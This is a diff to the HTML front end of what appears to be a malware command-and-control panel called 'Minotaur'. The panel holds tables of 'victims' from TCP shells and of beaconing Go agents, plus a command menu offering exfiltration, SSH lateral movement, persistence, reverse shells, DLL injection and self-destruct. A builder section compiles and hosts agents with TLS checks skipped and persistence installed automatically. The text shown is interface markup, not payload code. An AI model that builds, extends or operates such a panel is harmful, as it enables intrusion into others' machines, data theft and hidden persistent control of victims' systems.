@@ -36,10 +36,6 @@
             border-bottom: 2px solid #3b82f6;
             color: #60a5fa;
         }
-        .log-subtab-active {
-            border-bottom: 2px solid #3b82f6;
-            color: #60a5fa;
-        }
         .modal {
             display: none;
             position: fixed;
@@ -57,6 +53,10 @@
             border-radius: 8px;
             width: 60%;
             max-width: 600px;
+        }
+        .tab-log-btn {
+            transition: all 0.2s ease;
+            border-bottom: 2px solid transparent;
         }
     </style>
 </head>
@@ -82,8 +82,9 @@
         <button id="tab-build" class="tab-btn px-4 py-2 font-semibold">🛠️ Build Agent</button>
     </div>
 
-    <!-- TCP SECTION -->
+    <!-- ==================== TCP SHELLS SECTION ==================== -->
     <div id="tcp-section" class="space-y-6">
+        <!-- Victims Table -->
         <div class="bg-gray-800 rounded-xl shadow-lg overflow-hidden">
             <div class="bg-gray-700 px-4 py-3 border-b border-gray-600 flex justify-between items-center">
                 <div>
@@ -97,13 +98,20 @@
             <div class="overflow-x-auto">
                 <table class="min-w-full divide-y divide-gray-700">
                     <thead class="bg-gray-800">
-                        <tr><th class="px-4 py-3 text-left text-xs font-medium uppercase">ID</th><th>Host/IP</th><th>OS</th><th>Last Seen</th><th>Action</th></tr>
+                        <tr>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">ID</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">Host/IP</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">OS</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">Last Seen</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">Action</th>
+                        </tr>
                     </thead>
                     <tbody id="victim-table-body" class="divide-y divide-gray-700"></tbody>
                 </table>
             </div>
         </div>
 
+        <!-- Shell Outputs & Execute Command (combined) -->
         <div class="bg-gray-800 rounded-xl shadow-lg p-5">
             <h2 class="text-xl font-semibold mb-3"><i class="fas fa-terminal text-yellow-400 mr-2"></i>Shell Outputs & Execute Command</h2>
             <div id="outputs-container" class="space-y-4 mb-6"></div>
@@ -132,6 +140,7 @@
             </div>
         </div>
 
+        <!-- Dynamic Ports -->
         <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
             <div class="lg:col-span-2 bg-gray-800 rounded-xl shadow-lg p-5">
                 <h2 class="text-xl font-semibold mb-3"><i class="fas fa-plug text-green-400 mr-2"></i>Dynamic Ports (TCP Listeners)</h2>
@@ -163,30 +172,72 @@
         </div>
     </div>
 
-    <!-- AGENTS SECTION -->
+    <!-- ==================== HTTP AGENTS SECTION ==================== -->
     <div id="agents-section" class="hidden space-y-6">
+        <!-- Agents Table Card -->
         <div class="bg-gray-800 rounded-xl shadow-lg overflow-hidden">
             <div class="bg-gray-700 px-4 py-3 border-b border-gray-600 flex justify-between items-center">
                 <div>
                     <h2 class="text-xl font-semibold"><i class="fas fa-robot mr-2"></i>HTTP Agents (Go)</h2>
                     <p class="text-xs text-gray-300">Beaconing agents with exec, exfil, lateral, persistence</p>
                 </div>
-                <button id="clear-all-agents-btn" class="bg-red-600 hover:bg-red-700 text-sm px-3 py-1 rounded flex items-center gap-2">
-                    <i class="fas fa-trash-alt"></i> Clear All Agents
-                </button>
+                <div class="flex gap-2">
+                    <button id="refresh-agents-btn" class="bg-blue-600 hover:bg-blue-700 text-sm px-3 py-1 rounded flex items-center gap-2">
+                        <i class="fas fa-sync-alt"></i> Refresh Agents
+                    </button>
+                    <button id="clear-all-agents-btn" class="bg-red-600 hover:bg-red-700 text-sm px-3 py-1 rounded flex items-center gap-2">
+                        <i class="fas fa-trash-alt"></i> Clear All Agents
+                    </button>
+                </div>
             </div>
             <div class="overflow-x-auto">
                 <table class="min-w-full divide-y divide-gray-700">
                     <thead class="bg-gray-800">
-                        <tr><th>ID</th><th>Hostname</th><th>OS/Arch</th><th>IP</th><th>Last Beacon</th><th>Status</th><th>Actions</th></tr>
+                        <tr>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">ID</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">Hostname</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">OS/Arch</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">IP</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">Last Beacon</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">Status</th>
+                            <th class="px-4 py-3 text-left text-xs font-medium uppercase">Actions</th>
+                        </tr>
                     </thead>
-                    <tbody id="agents-table-body"></tbody>
+                    <tbody id="agents-table-body" class="divide-y divide-gray-700"></tbody>
                 </table>
             </div>
         </div>
+
+        <!-- Agent Command Panel Card -->
         <div class="bg-gray-800 rounded-xl shadow-lg p-5">
             <h2 class="text-xl font-semibold mb-3"><i class="fas fa-terminal text-yellow-400 mr-2"></i>Execute Command on Agent</h2>
-            <textarea id="agent-command-input" rows="3" class="w-full bg-gray-700 rounded-lg p-3 font-mono text-sm focus:ring-2 focus:ring-blue-500" placeholder="Enter system command (e.g. whoami, ls, ipconfig)"></textarea>
+            <select id="agent-cmd-type" class="bg-gray-700 rounded px-3 py-2 text-sm w-full mb-3">
+                <option value="exec">Raw System Command (exec)</option>
+                <option value="help">help – Show help</option>
+                <option value="sleep">sleep – Set beacon delay</option>
+                <option value="checkin">checkin – Force check-in</option>
+                <option value="pwd">pwd – Print working directory</option>
+                <option value="cd">cd – Change directory</option>
+                <option value="dir">dir/ls – List directory</option>
+                <option value="cat">cat – Display file content</option>
+                <option value="mkdir">mkdir – Create directory</option>
+                <option value="remove">remove/rm – Remove file/directory</option>
+                <option value="cp">cp – Copy file</option>
+                <option value="upload">upload – Upload file (base64)</option>
+                <option value="download">download – Download file (base64)</option>
+                <option value="shell">shell – Execute cmd/sh command</option>
+                <option value="powershell">powershell – Execute PowerShell (Windows)</option>
+                <option value="proc">proc – List processes</option>
+                <option value="net">net – Network enumeration</option>
+                <option value="exfil">exfil – Exfiltrate a file</option>
+                <option value="lateral">lateral – Lateral movement (SSH)</option>
+                <option value="persistence">persistence – Install persistence</option>
+                <option value="proxy">proxy – Start HTTP proxy</option>
+                <option value="shell-reverse">shell-reverse – Spawn reverse shell</option>
+                <option value="dll">dll – Inject DLL (Windows)</option>
+                <option value="delete">delete – Self-destruct</option>
+            </select>
+            <div id="agent-cmd-args" class="mb-3"></div>
             <div class="flex flex-wrap gap-3 mt-3">
                 <select id="agent-select" class="bg-gray-700 rounded-lg px-3 py-2 text-sm min-w-[200px]">
                     <option value="">-- Select an agent --</option>
@@ -196,38 +247,51 @@
                 </button>
             </div>
         </div>
+
+        <!-- Agent Activity Log Card -->
         <div class="bg-gray-800 rounded-xl shadow-lg p-5">
             <h2 class="text-xl font-semibold mb-3"><i class="fas fa-history text-yellow-400 mr-2"></i>Agent Activity Log</h2>
             <div id="agent-log" class="bg-black rounded-lg p-2 h-64 overflow-y-auto text-xs font-mono"></div>
         </div>
     </div>
 
-    <!-- ACTIVITY LOGS SECTION -->
+    <!-- ==================== ACTIVITY LOGS SECTION ==================== -->
     <div id="logs-section" class="hidden space-y-6">
         <div class="bg-gray-800 rounded-xl shadow-lg p-5">
             <div class="flex gap-4 border-b border-gray-700 mb-4">
-                <button id="tab-shell-logs" class="log-subtab px-3 py-1 text-sm font-semibold text-blue-400 border-b-2 border-blue-400">Shell Logs</button>
-                <button id="tab-agent-logs" class="log-subtab px-3 py-1 text-sm font-semibold text-gray-400">Agent Logs</button>
+                <button id="tab-shell-logs" class="tab-log-btn px-3 py-1 text-sm font-semibold text-blue-400 border-b-2 border-blue-400">Shell Logs</button>
+                <button id="tab-agent-logs" class="tab-log-btn px-3 py-1 text-sm font-semibold text-gray-400">Agent Logs</button>
             </div>
+
+            <!-- Shell Logs Panel -->
             <div id="shell-logs-panel">
                 <div class="mb-3 flex gap-2">
-                    <input type="text" id="shell-log-filter" placeholder="Filter by victim ID" class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
+                    <select id="shell-log-filter" class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
+                        <option value="">-- All victims --</option>
+                    </select>
                     <button id="refresh-shell-logs" class="bg-blue-600 px-3 py-1 rounded text-sm">Refresh</button>
+                    <button id="download-shell-logs" class="bg-green-600 px-3 py-1 rounded text-sm">📥 Download</button>
                 </div>
                 <div id="shell-logs-container" class="bg-black rounded-lg p-2 h-96 overflow-y-auto text-xs font-mono"></div>
             </div>
+
+            <!-- Agent Logs Panel -->
             <div id="agent-logs-panel" class="hidden">
                 <div class="mb-3 flex gap-2">
-                    <input type="text" id="agent-log-filter" placeholder="Filter by agent ID" class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
+                    <select id="agent-log-filter" class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
+                        <option value="">-- All agents --</option>
+                    </select>
                     <button id="refresh-agent-logs" class="bg-blue-600 px-3 py-1 rounded text-sm">Refresh</button>
+                    <button id="download-agent-logs" class="bg-green-600 px-3 py-1 rounded text-sm">📥 Download</button>
                 </div>
                 <div id="agent-logs-container" class="bg-black rounded-lg p-2 h-96 overflow-y-auto text-xs font-mono"></div>
             </div>
         </div>
     </div>
 
-    <!-- BUILD AGENT SECTION -->
+    <!-- ==================== BUILD AGENT SECTION ==================== -->
     <div id="build-section" class="hidden space-y-6">
+        <!-- Build Form Card -->
         <div class="bg-gray-800 rounded-xl shadow-lg p-5">
             <h2 class="text-xl font-semibold mb-3"><i class="fas fa-code-branch text-green-400 mr-2"></i>Compile Minotaur Agent</h2>
             <p class="text-sm text-gray-300 mb-4">Customise the agent's communication parameters and compile for any platform.</p>
@@ -252,7 +316,7 @@
                     <input type="checkbox" id="build-insecure-tls" class="mr-2" checked>
                     <label class="text-sm font-medium">Skip TLS verification (InsecureTLS)</label>
                 </div>
-                <div class="flex items-center mt-2">
+                <div class="flex items-center">
                     <input type="checkbox" id="build-auto-persistence" class="mr-2">
                     <label class="text-sm font-medium">Auto‑install Persistence (on first run)</label>
                 </div>
@@ -271,11 +335,17 @@
                         <option value="arm64">arm64 (ARM64)</option>
                     </select>
                     <button id="build-agent-btn" class="bg-green-600 hover:bg-green-700 px-5 py-2 rounded-lg flex items-center gap-2">
-                        <i class="fas fa-cogs"></i> Compile & Download
+                        <i class="fas fa-cogs"></i> Compile & Host
                     </button>
                 </div>
             </div>
             <div id="build-status" class="mt-4 p-2 bg-black rounded text-sm font-mono hidden"></div>
+        </div>
+
+        <!-- Download & Deploy Agent Card -->
+        <div class="bg-gray-800 rounded-xl shadow-lg p-5">
+            <h2 class="text-xl font-semibold mb-3"><i class="fas fa-download text-blue-400 mr-2"></i>Download & Deploy Agent</h2>
+            <div id="available-agents-list" class="space-y-4"></div>
         </div>
     </div>
 </div>
